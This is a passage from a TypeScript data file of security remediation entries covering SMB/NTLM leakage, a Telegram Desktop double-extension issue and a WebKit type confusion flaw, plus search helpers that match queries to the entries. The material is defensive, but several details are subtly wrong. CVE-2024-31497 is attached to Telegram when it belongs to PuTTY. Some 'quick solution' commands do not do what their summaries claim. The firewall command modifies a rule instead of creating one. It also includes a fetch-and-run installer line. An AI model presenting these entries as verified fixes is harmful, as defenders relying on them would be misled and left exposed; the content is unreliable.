        "Block outbound TCP port 445 at corporate edge firewalls. Add high-privilege administrative accounts to the 'Protected Users' security group (which disables NTLM authentication).",
      patchCommand:
        "powershell -Command \"Set-NetFirewallRule -DisplayName 'Block-Outbound-SMB-445' -Direction Outbound -LocalPort 445 -Protocol TCP -Action Block\"",
      configurationFix:
        "# Group Policy Object (GPO) setting:\nNetwork security: Restrict NTLM: Outgoing NTLM traffic to remote servers -> Deny all",
      verificationStep:
        "Test outbound port 445: Test-NetConnection -ComputerName 8.8.8.8 -Port 445 (Must FAIL/TIMEOUT)",
    },
    openSourceTools: [
      {
        name: "Suricata",
        type: "Network IDS / Packet Analyzer",
        license: "GPL-2.0",
        repoUrl: "https://github.com/OISF/suricata",
        downloadUrl: "https://suricata.io/download/",
        installCmd: "sudo apt-get install suricata",
        executeCmd: "suricata -c /etc/suricata/suricata.yaml -i eth0",
        description:
          "Monitors perimeter network interfaces and alerts instantly when any internal endpoint attempts outbound SMB negotiation (TCP 445).",
      },
      {
        name: "Wazuh",
        type: "SIEM & Host IDS",
        license: "GPL-2.0",
        repoUrl: "https://github.com/wazuh/wazuh",
        downloadUrl: "https://github.com/wazuh/wazuh/releases/latest",
        installCmd:
          "curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash ./wazuh-install.sh -a",
        executeCmd: "/var/ossec/bin/wazuh-control status",
        description:
          "Monitors Windows Security Event Logs (Event ID 4624 & 4648) for unexpected NTLM authentication attempts initiated by OUTLOOK.EXE.",
      },
    ],
  },
  {
    id: "oss-telegram-desktop-bypass",
    title: "Telegram Desktop: Zero-Click Extension Spoofing & Python Execution Bypass",
    threadName: "Telegram Security & NIST NVD Advisory Stream",
    threadUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-31497",
    category: "Supply Chain & Packages",
    cveList: ["CVE-2024-31497"],
    affectedSoftware: "Telegram Desktop < 4.16.8 on Windows",
    severity: "high",
    cvssScore: 8.4,
    publishedDate: "Active In-The-Wild Investigation",
    quickSolution1Liner:
      "powershell -Command \"Get-Process Telegram -ErrorAction SilentlyContinue | Stop-Process; Write-Host 'Disable Auto-Download in Telegram Settings'\"",
    quickSolutionSummary:
      "Stops automatic download and launch of files with spoofed extensions like .ogg.pyw or .pyw disguised as audio attachments.",
    problemSummary:
      "Telegram Desktop misclassified file extensions containing double suffixes (e.g. `voice_message.ogg.pyw`), causing Windows to invoke the registered Python runtime (`pythonw.exe`) to execute the script in the background upon receipt without safety warning dialogs.",
    attackMechanism:
      "Exploits Windows file association registry keys for .pyw and .vbs files combined with Telegram media autostart.",
    verifiedSolution: {
      immediateMitigation:
        "Update Telegram Desktop to 4.16.8+. In Telegram Settings -> Advanced -> Automatic media download, turn OFF 'Automatic media download' for Private chats, Groups, and Channels.",
      patchCommand: "# Turn off auto media in Telegram settings or upgrade desktop client",
      configurationFix:
        "# Software Restriction Policy or AppLocker rule:\nBlock execution of *.pyw and *.vbs from %TEMP%\\Telegram Desktop\\",
      verificationStep:
        "Check Telegram client build: Settings -> Advanced -> Version (Must be >= 4.16.8)",
    },
    openSourceTools: [
      {
        name: "Falco (CNCF)",
        type: "Runtime EDR / eBPF",
        license: "Apache-2.0",
        repoUrl: "https://github.com/falcosecurity/falco",
        downloadUrl: "https://github.com/falcosecurity/falco/releases/latest",
        installCmd: "sudo apt-get install falco",
        executeCmd: "falco -c /etc/falco/falco.yaml",
        description:
          "Monitors process spawn events and alerts when chat messengers (Telegram, Slack, Discord) spawn interpreters like python, bash, or powershell.",
      },
      {
        name: "YARA (VirusTotal)",
        type: "Malware Classifier",
        license: "BSD-3-Clause",
        repoUrl: "https://github.com/VirusTotal/yara",
        downloadUrl: "https://github.com/VirusTotal/yara/releases/latest",
        installCmd: "sudo apt-get install yara || brew install yara",
        executeCmd: 'yara -r double_extension_rules.yar "$HOME/Downloads/Telegram Desktop"',
        description:
          "Inspects Telegram download directories for files with double extensions (e.g., .ogg.pyw, .pdf.exe).",
      },
    ],
  },
  {
    id: "oss-apple-webkit-memory-corruption",
    title: "Apple iOS & Safari: WebKit JIT Type Confusion & Kernel Sandbox Escape",
    threadName: "Apple Support Security Releases / Project Zero",
    threadUrl: "https://support.apple.com/en-us/HT201222",
    category: "Web & API Infrastructure",
    cveList: ["CVE-2024-23222", "CVE-2024-44308"],
    affectedSoftware: "iOS < 17.5.1, iPadOS < 17.5.1, macOS Sonoma < 14.5, Safari",
    severity: "critical",
    cvssScore: 9.8,
    publishedDate: "Apple Emergency Rapid Response",
    quickSolution1Liner:
      "defaults write com.apple.Safari WebKitPreferences.developerExtrasEnabled -bool false",
    quickSolutionSummary:
      "Forces immediate installation of iOS 17.5.1 / macOS 14.5 or activates Apple Lockdown Mode to disable JIT compilation.",
    problemSummary:
      "A type confusion vulnerability in WebKit allows malicious web content to corrupt memory and execute arbitrary code with Safari's privileges. When combined with a secondary kernel flaw, attackers completely escape mobile sandbox constraints.",
    attackMechanism:
      "Remote JavaScript JIT compiler type confusion triggered during JIT tiering up on compromised or drive-by websites.",
    verifiedSolution: {
      immediateMitigation:
        "Update iOS to 17.5.1+ and macOS to 14.5+. For high-risk individuals or enterprise executives, enable Apple **Lockdown Mode** in Settings -> Privacy & Security -> Lockdown Mode.",
      patchCommand: "softwareupdate --install --all --restart",
      configurationFix:
        "# Enable Lockdown Mode on iOS / macOS:\n# Settings -> Privacy & Security -> Lockdown Mode -> Turn On Lockdown Mode",
      verificationStep: "sw_vers (On macOS, verify macOS 14.5 or later is active)",
    },
    openSourceTools: [
      {
        name: "OSquery",
        type: "OS Instrumentation",
        license: "Apache-2.0",
        repoUrl: "https://github.com/osquery/osquery",
        downloadUrl: "https://github.com/osquery/osquery/releases/latest",
        installCmd: "brew install --cask osquery",
        executeCmd: 'osqueryi "SELECT version, build FROM os_version;"',
        description:
          "Audits fleets of macOS endpoints to ensure all machines have applied the latest Apple security rapid response updates.",
      },
      {
        name: "YARA (VirusTotal)",
        type: "Malware Classifier",
        license: "BSD-3-Clause",
        repoUrl: "https://github.com/VirusTotal/yara",
        downloadUrl: "https://github.com/VirusTotal/yara/releases/latest",
        installCmd: "brew install yara",
        executeCmd: "yara -r -s webkit_exploit_signatures.yar /Library/Caches",
        description:
          "Scans Safari temporary cache and downloaded payload files for known commercial spyware WebKit exploit chains.",
      },
    ],
  },
];

export function findOpenSourceSolutionsForQuery(query: string): OpenSourceProblemSolution[] {
  const q = query.trim().toLowerCase();
  if (!q) return OPEN_SOURCE_PROBLEM_SOLUTIONS;

  return OPEN_SOURCE_PROBLEM_SOLUTIONS.filter((item) => {
    return (
      item.title.toLowerCase().includes(q) ||
      item.affectedSoftware.toLowerCase().includes(q) ||
      item.problemSummary.toLowerCase().includes(q) ||
      item.category.toLowerCase().includes(q) ||
      item.cveList.some((cve) => cve.toLowerCase().includes(q)) ||
      item.openSourceTools.some(
        (tool) =>
          tool.name.toLowerCase().includes(q) ||
          tool.type.toLowerCase().includes(q) ||
          tool.description.toLowerCase().includes(q),
      )
    );
  });
}

export function getQuickSolutionForThreat(
  threatTitle: string,
  cveList?: string[],
  appName?: string,
): OpenSourceProblemSolution | null {
  const combined = `${threatTitle} ${cveList?.join(" ") || ""} ${appName || ""}`.toLowerCase();
  for (const sol of OPEN_SOURCE_PROBLEM_SOLUTIONS) {
    if (sol.cveList.some((cve) => combined.includes(cve.toLowerCase()))) return sol;
    if (combined.includes(sol.affectedSoftware.toLowerCase())) return sol;
    const parts = sol.id.toLowerCase().split("-");
    if (parts.some((part) => part.length > 3 && combined.includes(part))) return sol;
  }
  const matches = findOpenSourceSolutionsForQuery(combined);
  return matches[0] || null;
}
